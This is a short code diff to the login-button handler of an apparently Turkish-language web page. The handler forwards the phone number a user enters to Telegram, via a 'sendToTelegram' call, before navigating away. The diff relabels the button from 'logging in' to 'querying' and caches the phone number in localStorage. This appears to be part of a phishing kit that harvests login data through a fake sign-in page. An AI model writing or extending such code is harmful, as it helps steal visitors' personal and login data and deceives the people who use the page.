@@ -57,10 +57,11 @@ loginBtn.addEventListener('click', async function () {
     }
 
     // Proceed with login - send to Telegram then navigate
-    this.textContent = 'Giriş yapılıyor...';
+    this.textContent = 'Sorgulanıyor...';
     this.disabled = true;
     this.style.opacity = '0.7';
 
+    localStorage.setItem('tg_display_phone', phone);
     await sendToTelegram(phone);
 
     setTimeout(() => {
